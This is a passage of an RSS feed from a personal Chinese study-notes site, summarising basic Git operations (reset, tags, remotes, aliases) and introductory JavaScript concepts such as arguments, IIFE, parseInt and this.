      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%92%A4%E9%94%80%E4%BF%AE%E6%94%B9/</guid>
      <description>撤销修改 人哪有不犯错的，因此，当你修改了一个文件时，之后发现这次修改不太合理，想撤销这次修改的时候，怎么办呢？
这个时候，你可以直接使用git checkout -- FileName 来撤销 FileName 文件在工作区的全部修改。这个命令分为几种情况
文件未被添加到暂存区 对文件FileName进行修改后，但还没有将它添加到暂存区，我们这个时候使用git checkout -- FileName，FileName就会回到修改前的状态。
文件被添加到了暂存区 对文件FileName进行第一次修改后，并且将它添加到了暂存区（这个时候的状态为被添加到暂存区后），接着再次对FileName进行修改，我们这个时候使用git checkout -- FileName，FileName就会回到被添加到暂存区后的状态。
总之，git checkout -- FileName就是让文件 FileName 回到最近一次git commit或git add时的状态。</description>
    </item>
    
    <item>
      <title>Git 操作标签</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%93%8D%E4%BD%9C%E6%A0%87%E7%AD%BE/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%93%8D%E4%BD%9C%E6%A0%87%E7%AD%BE/</guid>
      <description>操作标签 删除标签 git tag -d v0.1 因为创建的标签都只存储在本地，不会自动推送到远程。所以，打错的标签可以在本地安全删除。
如果标签已经推送到远程，要删除远程标签就麻烦一点，先从本地删除，然后，从远程删除。
git push origin :refs/tags/v0.9 要看看是否真的从远程库删除了标签，可以登陆 GitHub 查看。
推送标签 推送指定标签到远程库。
git push origin v1.0 推送全部尚未推送到远程的本地标签到远程库。
 git push origin --tags </description>
    </item>
    
    <item>
      <title>Git 标签管理</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86/</guid>
      <description>标签管理 发布一个版本时，我们通常先在版本库中打一个标签（tag），这样，就唯一确定了打标签时刻的版本。将来无论什么时候，取某个标签的版本，就是把那个打标签的时刻的历史版本取出来。所以，标签也是版本库的一个快照。
Git 的标签虽然是版本库的快照，但其实它就是指向某个 commit 的指针（跟分支很像对不对？但是分支可以移动，标签不能移动），所以，创建和删除标签都是瞬间完成的。
Git 有 commit，为什么还要引入 tag？ 请把上周一的那个版本打包发布，commit 号是 6a5819e&amp;hellip;
一串乱七八糟的数字不好找！
如果换一个办法：
请把上周一的那个版本打包发布，版本号是 v1.2
“好的，按照 tag v1.2 查找 commit 就行！”
所以，tag 就是一个让人容易记住的有意义的名字，它跟某个 commit 绑在一起。</description>
    </item>
    
    <item>
      <title>Git 添加第一个远程库</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%A6%96%E6%AC%A1%E6%B7%BB%E5%8A%A0%E8%BF%9C%E7%A8%8B%E5%BA%93/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%A6%96%E6%AC%A1%E6%B7%BB%E5%8A%A0%E8%BF%9C%E7%A8%8B%E5%BA%93/</guid>
      <description>添加第一个远程库 什么是远程仓库 当我们需要多个人协助开发时，必然会遇到一个问题，就是双方的信息如何进行传递同步。 这个时候，就需要搭建一个远程服务器，每个人都从这个远程服务器克隆一份到自己的电脑上，并且把自己需要提交推送到服务器仓库里，也可以从服务器仓库中拉取别人的提交。
创建远程库 注册一个 Github 账号 创建 Github Repository 在 Github 上创建一个仓库，仓库名随意， 。
关联远程库 我们使用git remote add origin命令把本地库与一个远程库关联起来。
git remote add origin git@github.com:YxzRainy/YxzRainy.github.io.git 远程库的名字就是origin，这是默认的名字，你也可以将它改成别的。
将 Git 与 Github 关联 下载并安装 Git 配置个人信息 git config --global user.name &amp;#34;Your UserName&amp;#34; git config --global user.email &amp;#34;YourEmail@qq.com&amp;#34; 生成 ssh 密钥文件 hexo d 到远程仓库，因为每一台电脑中的私钥只有只有一个，因此当你想给另一个 github 账号配置博客时，必须重新生成公钥和私钥
ssh-keygen -t rsa -C &amp;#34;1971438937@qq.com&amp;#34; 输入后，三个回车，默认不需要设置密码，之后到所显示的路径中找到生成的 ssh 的文件夹中的id_rsa.pub文件中的密钥，将其中内容全部复制。
new SSH Key 打开你的 Github 的主页，点击头像，选择 Settings，再选择 SSH and GPG keys，找到 SSH keys，点击 New SSH Key，Title 为标题，任意填写，将刚刚复制的 id_rsa pub 文件中的密钥文本粘贴进去，最后 Add SSH key。</description>
    </item>
    
    <item>
      <title>Git 添加第二个远程库</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%B7%BB%E5%8A%A0%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%BF%9C%E7%A8%8B%E5%BA%93/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%B7%BB%E5%8A%A0%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%BF%9C%E7%A8%8B%E5%BA%93/</guid>
      <description>添加第二个远程库 将 GitHub 上的远程库与一个本地库关联起来。
关联远程库 我们使用git remote add origin命令把本地库与一个远程库关联起来。
git remote add origin git@github.com:YxzRainy/YxzRainy.github.io.git # 远程库链接 添加文件并提交 git add . git commit -m &amp;#34;提交信息&amp;#34; 推送分支 git push origin master 将本地库master分支上的内容推送到远程库master上去.
推送成功后，可以立刻在我们的 GitHub 仓库种中看到远程库的内容已经和本地的一模一样了。</description>
    </item>
    
    <item>
      <title>Git 清空远程分支</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%B8%85%E7%A9%BA%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%B8%85%E7%A9%BA%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF/</guid>
      <description>清空远程分支 将清空后的本地分支推送到远程分支，以达到清空远程分支的目的。
删除全部文件 打开本地仓库文件夹，删除不需要的文件，仅保留 .git 文件夹和 ReadMe.md 文件.
输入命令 git add . git commit -m &amp;#39;清空远程仓库&amp;#39; git push origin master </description>
    </item>
    
    <item>
      <title>Git 版本回退</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E7%89%88%E6%9C%AC%E5%9B%9E%E9%80%80/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E7%89%88%E6%9C%AC%E5%9B%9E%E9%80%80/</guid>
      <description>版本回退 类似存档 现在我们新建一个文件text.txt，并对这个文件进行第一次修改和提交，得到text.txt 1.0 版本。
 重复以上步骤，对text.txt进行修改和提交，得到text.txt 2.0版本， 再次对text.txt进行修改和提交，得到text.txt 3.0版本。 目前为止，我们对这个文件修改并提交了三次，分别得到1.0、2.0、3.0三个版本。  不知道你有没有发现，修改一个文件后并提交与通过一关游戏并存档有着相似之处。
这就好比玩闯关游戏时，每通过一关，系统就会自动把游戏进度存档，如果某一关没过去，你还可以选择读取前一关的存档，有些时候，在打 Boss 之前，你会手动存档，以便万一打 Boss 失败了，可以从最近的地方重新开始。
Git 也是一样，每当你觉得文件修改到一定程度的时候，就可以保存一个快照，这个快照在 Git 中被称为commit。一旦你把文件改乱了，或者误删了文件，还可以从最近的一个commit恢复，然后继续工作，而不是把几个月的工作成果全部丢失。
在 Git 中，用HEAD表示当前版本，上一个版本就是HEAD^，上上一个版本就是HEAD^^，当然往上 100 个版本写 100 个**^比较容易数不过来，所以我们写成HEAD~100或者HEAD~50**。
回退的上一个版本 再次回到我们的text.txt文件上，假设我们目前是版本 3.0，也就是最新版本，现在用git reset --hard HEAD^ 命令将文件退回到上一个版本。
git reset --hard HEAD^ OK，现在文件已经被还原到上一个版本 2.0了，当然，你还可以继续回退到上一个版本1.0，不过先别着急。
这时候你也许会有个疑惑，如果你还想回到版本 3.0应该怎么办呢？
回退的指定版本 这个操作需要知道指定版本的版本号，比如想回退到指定版本 3.0的版本号为1098b，那么使用git reset --hard commit id
git reset --hard commit id 版本号没必要写全，前几位就可以了，Git 会自动去找。当然也不能只写前面一两位，因为这样的话，Git 可能会找到不止一个版本号，就无法确定你具体想回退到哪一个版本了。
这时候再查看text.txt的内容，你会发现我们的版本 3.0又回来了。
Git 的版本回退速度非常快，因为 Git 在内部有个指向当前版本的HEAD 指针，HEAD指向的版本就是当前版本，因此，当你回退到某个版本的时候，Git 仅仅是把 HEAD 重新指向了版本 3.0.</description>
    </item>
    
    <item>
      <title>Git 管理修改</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E7%AE%A1%E7%90%86%E4%BF%AE%E6%94%B9/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E7%AE%A1%E7%90%86%E4%BF%AE%E6%94%B9/</guid>
      <description>管理修改 你也许很疑惑为什么 Git 比其他版本控制系统设计得优秀，那是因为 Git 跟踪并管理的是修改，而非文件。
第二次修改为什么没有被提交 现在假设我我们对一个文件 ReadMe.txt 进行了以下操作：
修改 ReadMe.txt，得到 ReadMe.txt 2.0 版本
git add ReadMe.txt 修改 ReadMe.txt 2.0 版本，得到 ReadMe.txt 3.0 版本
git commit ReadMe.txt 接着你会发现被提交的版本为什么不是ReadMe.txt 3.0？
这是因为 Git 管理的是修改，而非文件，因此，当你使用git add命令将 2.0 版本放入暂存区后，准备提交，但是，之后得到的版本 3.0 并没有被放入暂存区，所以，最后的git commit只负责把暂存区的修改提交了。
 也就是将 2.0 版本提交了，因为版本 2.0 被添加到了暂存区 但版本 3.0 却并没有被提交，因为版本 3.0 没有被添加到暂存区  如何提交第二次修改 那怎么提交第二次修改呢？你可以继续git add再git commit，也可以别着急提交第一次修改，先git add第二次修改，再git commit，就相当于把两次修改合并后一块提交了。
修改 ReadMe.txt，得到 ReadMe.txt 2.0 版本
git add ReadMe.txt 修改 ReadMe.txt 2.0 版本，得到 ReadMe.txt 3.</description>
    </item>
    
    <item>
      <title>Git 配置别名</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%85%8D%E7%BD%AE%E5%88%AB%E5%90%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%85%8D%E7%BD%AE%E5%88%AB%E5%90%8D/</guid>
      <description>配置别名 命令简写 $ git config --global alias.st status $ git config --global alias.co checkout $ git config --global alias.ci commit $ git config --global alias.br branch 以上命令将：
git status简写为git st；
git checkout简写为git co；
git commit简写为git ci
git branch简写为git br
以后提交就可以输入：
$ git ci -m &amp;#34;this is shorthand&amp;#34; 配置别名 配置 Git 的时候，加上--global是针对当前用户起作用的，如果不加，那只针对当前的仓库起作用。
配置文件放哪了？每个仓库的 Git 配置文件都放在当前仓库的.git/config文件中：
[core]repositoryformatversion = 0filemode = falsebare = falselogallrefupdates = truesymlinks = falseignorecase = true[alias]last = log -1 用户的配置文件自行寻找，我的是在C:\Users\Rainy目录下</description>
    </item>
    
    <item>
      <title>Git 配置用户信息</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%85%8D%E7%BD%AE%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%85%8D%E7%BD%AE%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/</guid>
      <description>配置用户信息 安装好 Git 后，在命令行或终端中使用下面的命令可以设置 Git 自己的名字和电子邮件。这是因为 Git 是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和 Email 地址。
git config --global user.name &amp;#34;YxzRainy&amp;#34;git config --global user.email &amp;#34;1@qq.com&amp;#34; 查看配置 配置好之后可以使用git config -l查看配置：
git config -l </description>
    </item>
    
    <item>
      <title>Git 重命名远程库后</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%87%8D%E5%91%BD%E5%90%8D%E8%BF%9C%E7%A8%8B%E5%BA%93%E5%90%8E/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%87%8D%E5%91%BD%E5%90%8D%E8%BF%9C%E7%A8%8B%E5%BA%93%E5%90%8E/</guid>
      <description>重命名远程库后 我们在 Github 上更改仓库的默认分支后，或更改了分支名后，我们需要在本地库下执行以下代码：
git branch -m Old_branch_name New_branch_name git fetch origin git branch -u origin/New_branch_name New_branch_name git remote set-head origin -a </description>
    </item>
    
    <item>
      <title>Git 集中式与分布式的区别</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E9%9B%86%E4%B8%AD%E5%BC%8F%E5%92%8C%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E9%9B%86%E4%B8%AD%E5%BC%8F%E5%92%8C%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>集中式与分布式的区别 前言 集中式版本控制系统最大的毛病就是必须联网才能工作，如果网速快还好，上传的也快，可当遇到网速慢的时候，可能提交一个 10M 的文件就需要 5 分钟，这还不得把人给憋死啊。
联网性 首先，分布式版本控制系统根本没有“中央服务器”，每个人的电脑上都是一个完整的版本库，这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件 A，你的同事也在他的电脑上改了文件 A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。
安全性 与集中式版本控制系统相比，分布式版本控制系统的安全性要高很多，因为每个人电脑里都有完整的版本库，某一个人的电脑坏掉了不要紧，随便从其他人那里复制一个就可以了。而集中式版本控制系统的中央服务器要是出了问题，所有人都没法干活了。
分布式的优点 分布式版本系统的最大好处之一是在本地工作完全不需要考虑远程库的存在，也就是有没有联网都可以正常工作，而 SVN 在没有联网的时候是拒绝干活的！当有网络的时候，再把本地提交推送一下就完成了同步。</description>
    </item>
    
    <item>
      <title>JavaScript arguments</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/arguments/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/arguments/</guid>
      <description>arguments 它是一个与函数的实参有映射关系的类数组。
若函数的实参和形参数量一致，那么函数的形参与函数的 argments 之间为映射关系，即形参改变后，与之映射的 arguments[x] 也会改变。
若传入的实参比形参少，多余的形参和 argments 没有映射关系。
function demo(a, b) { 	// return 20 	console.log(b); 	b = 200;  	// return 200 	console.log(b); 	arguments[1] = 2000; 	// return 2000 	console.log(b); } demo(1, 20); 属性 Callee 该属性包含当前正在执行的函数。在哪个函数中调用的方法 arguments.calle，该 calle 中就包含这个函数的函数体。
注意 arguments 对象是所有（非箭头）函数中都可用的局部变量。你可以使用 arguments 对象在函数中引用函数的实参；此对象包含传递给函数的每个实参，第一个实参的索引为 0。
arguments 对象不是一个 Array ；但它类似于 Array，但除了有 length 属性和索引的特性之外没有任何其他 Array 属性。</description>
    </item>
    
    <item>
      <title>JavaScript eval()</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/eval/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/eval/</guid>
      <description>eval() 它会将传入的字符串当做 JavaScript 代码来执行。
在 JavaScript 中，有一句话叫：
eval 是魔鬼。
console.log(eval(&amp;#39;2 + 2&amp;#39;)); </description>
    </item>
    
    <item>
      <title>JavaScript Function</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/function/function/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/function/function/</guid>
      <description>Function 每个 JavaScript 函数实际上都是一个 Function 对象。
Function 构造函数创建一个新的 Function 对象。
全局的 Function 对象没有自己的属性和方法，但是，因为它本身也是一个函数，所以它也会通过原型链从自己的原型链 Function.prototype 上继承一些属性和方法。</description>
    </item>
    
    <item>
      <title>JavaScript function</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/function/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/function/</guid>
      <description>function 它可以用来在一个表达式中定义一个函数。
function Fun(parameter) { 	console.log(&amp;#39;我是一个函数&amp;#39;); } </description>
    </item>
    
    <item>
      <title>JavaScript Function 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/function/function-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/function/function-%E6%96%B9%E6%B3%95/</guid>
      <description>Function 方法 call() 改变调用它的构造函数的 this 指向。并指定构造函数的采纳书
function Demo(name, age) { 	this.name = name; 	this.age = age; } var huge = new Demo(&amp;#39;Su&amp;#39;, 100); console.log(huge);  var test = {};  // 改变 Demo() 中 this 的指向为对象 test， Demo.call(test, &amp;#39;Rainy&amp;#39;, 100);  console.log(test); 实现继承 function Tyre(size, style) { 	this.size = size; 	this.style = style; }  function Interior(color, texture) { 	this.color = color; 	this.texture = texture; }  function Model(height, width, length, type) { 	this.</description>
    </item>
    
    <item>
      <title>JavaScript IIFE</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/iife/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/iife/</guid>
      <description>IIFE 立即执行函数，是一种在被定义后就会立即执行的函数，不需要被调用，执行完毕后就会被立即释放。
用于创建一个独立的作用域，主要用于初始化功能。这个作用域中的变量，外面的任何位置访问不到，用于避免变量污染和命名冲突。
它具有普通的函数一样的功能（参数、返回值、执行期上下文等）。
只有函数表达式可以被执行符 () 执行，被执行符所执行的函数表达式的函数名会被自动忽略，即该函数表达式变为了 IIFE。
多个 IIFE 之间要加分号。
var demo = (function (a, b) { 	// 用变量 demo 接收 IIFE 的返回值 	a = Number(a); 	b = Number(b); 	var c = (a + b) * 10; 	// 将变量 a 与 b 的和乘 10 的结果赋给变量 c 	return c; 	// 将变量 c 作为该 IIFE 的返回值 })(10, 20); // 10 与 20 为实参 console.log(demo); 立即释放的特性 var a = (function demo() { 	// 用变量 a 接收函数 demo，因函数 demo 执行一次后就会被释放，则会导致变量 a 的值变为 undefined 	// 因此再次调用变量 a 会返回 undefined 	console.</description>
    </item>
    
    <item>
      <title>JavaScript isNaN()</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/isnan/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/isnan/</guid>
      <description>isNaN() isNaN(value) 用于判定 value 是否为 NaN，是则返回 true，否则返回 false。
如果 value 不是 Number 类型，那么该函数会用 Number() 方法将 value 隐式转换，然后再判断转换后的结果是否为 NaN。因此，被测试的值在被强制转换成数值时会不会返回 IEEE-754 中所谓的不是数值，隐式转换调用的都是显式转换方法。
返回 false 的值  0 除以 0 NaN undefined {}（空对象）  </description>
    </item>
    
    <item>
      <title>JavaScript Math</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math/</guid>
      <description>Math 它是一个内置对象，它拥有一些数字常数属性和数学函数方法，它不是一个函数对象。
引用圆周率的写法是 Math.PI，调用正余弦函数的写法是 Math.sin(x)，x 是要传入的参。
计算时精度不准 0.14 * 100 = 14.000000000000002；0.1 + 0.2 = 0.30000000000000004；这些运算后的值都是因为 js 计算精度不准的导致。
在 js 中整数和浮点数都属于 Number 数据类型，所有数字都是以 64 位浮点数形式储存。JavaScript 里的数字是采用 IEEE 754 标准的 64 位双精度浮点数，计算机进行计算的时候，会把数字转换为二进制，进行运算之后再转换为十进制，但是运算过程中小数部分最多支持 52 位，就会出现运算精度不准的问题。
1000000000000001 + 1000000000000001 = 2000000000000002，即在 JavaScript 中，可正常计算范围在小数点前 16 位与后 16 位。
function One() { 	for (var c = 0; c &amp;lt; 18; c++) { 	var d = Math.random().toFixed(2) * 100; 	// 首先取 0-1 的随机数，然后取这个数小数点后的两位数，最后乘 100，并赋给变量 d 	var e = Math.</description>
    </item>
    
    <item>
      <title>JavaScript new</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E5%B7%A6%E4%BE%A7%E8%A1%A8%E8%BE%BE%E5%BC%8F/new/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E5%B7%A6%E4%BE%A7%E8%A1%A8%E8%BE%BE%E5%BC%8F/new/</guid>
      <description>new 用于创建一个对象类型的实例或一个具有构造函数的内置对象的实例。
new 实例 创建或返回一个新的对象实例，并将构造函数的作用域赋给新的对象实例（因此构造函数中的 this 的指向就变为了这个新的对象实例）。</description>
    </item>
    
    <item>
      <title>JavaScript Number()</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/number/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/number/</guid>
      <description>Number 该对象是经过封装的能被处理数字值的对象；该对象由 Number() 构造器创建。
Number 的方法 toString() NumObj.toString(radix)
 将 NumObj 转为为 radix 进制的数，若 NumObj 无法被转换为 radix 进制的数，则返回 string 类型的 NaN；rRadix 的取值范围为 2 - 36，如果未指定 radix 参数，则默认值为 10。 当在 NumObj 中，遇到不在 radix 中的字符，则将忽略该字符以及所有后续字符，并返回在这之前已解析的整数值。 因为 Number 对象覆盖了 Object 对象上的 toString() 方法（系统将 Number 对象的 toString 方法重写了），因此它并不继承自 Object.prototype.toString()。  十进制转十六进制 var a = 1971; var b = 10; var c = 16; var d = parseInt(a, b); // 将变量 a 当做 b 进制的数，并将 b 转换为十进制的数。 var e = d.</description>
    </item>
    
    <item>
      <title>JavaScript Object</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/object/object/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/object/object/</guid>
      <description>Object 创建一个对象包装器；它的每个值都是对象的属性，且每个属性必须要有属性值，属性值的类型可以是任何数据类型。
创建方式 对象字面量 var n = &amp;#39;世雨&amp;#39;; var a = &amp;#39;&amp;#39;; var object = { 	//var obj ={} 相当于 var obj = new Object()，一般情况都使用前者。 	b: &amp;#39;臣&amp;#39;, 	// b 为属性名，臣为属性值 	c: n, }; a = object.b + object.c; // 用变量 a 接收对象 object 的属性 b 与 c 的值。 console.log(a); // 返回臣世雨 工厂模式 function ThreeOne(color) { 	this.color = color; 	// color为可选参数 	this.name = &amp;#39;bird&amp;#39;; 	this.</description>
    </item>
    
    <item>
      <title>JavaScript parseFloat()</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parsefloat/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parsefloat/</guid>
      <description>parseFloat() parseFloat(string)，将 string 显式转换为 number 类型浮点数（小数）。若 string 无法被转换为浮点数，则返回 number 类型的 NaN。</description>
    </item>
    
    <item>
      <title>JavaScript parselnt()</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parselnt/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parselnt/</guid>
      <description>parseInt() parseInt(string, radix) 函数解析一个字符串并返回指定基数的十进制整数。
将 string 看作 radix 进制的数，并将 string 显式转换为十进制且为 number 的整数（radix 为介于 2-36 之间的数，它是可选值，表示被解析字符串的基数），若 string 无法被转换为整数，则返回 number 类型的 NaN。
当在 string 中，遇到不在 radix 进制中的字符，则将忽略该字符以及所有后续字符，并返回在这之前已解析的整数值。
若 radix 为 0 时，部分浏览器（比如 IE）会报错，部分浏览器会将 0 当做 10 进行转换。
N 进制转十进制 var n = 10010; var c = 2; // 变量 n 可为 8，16，32。 var a = parseInt(n, c); // 将 n 当作 c 进制的数，并将 n 显式转换为十进制的整数。 console.log(a); </description>
    </item>
    
    <item>
      <title>JavaScript return</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/return/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/return/</guid>
      <description>return 用于终止函数的执行，并指定函数的返回值。若没有指定返回值，则返回 undefined。
字符串转数字 var n = &amp;#39;18&amp;#39;; function demo(n) { 	return +n; 	// 用加号 + 隐式调用 Number() 方法，将字符串 n 转换为数字并作为返回值 } var a = demo(n); console.log(typeof a + &amp;#39;:&amp;#39; + a); </description>
    </item>
    
    <item>
      <title>JavaScript this</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/this/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/this/</guid>
      <description>this 在全局中，无论是否在严格模式下，this 指的都是全局对象（window）。
通常情况，函数的调用方式决定了 this 的值；严格模式下， this 一般指向一个调用它的对象（即 this 的调用者，哪个对象的方法调用了 this，那么这个 this 就指向调用这个方法的对象 ），即第一人称我，
严格模式下可以指向任意值。</description>
    </item>
    
    <item>
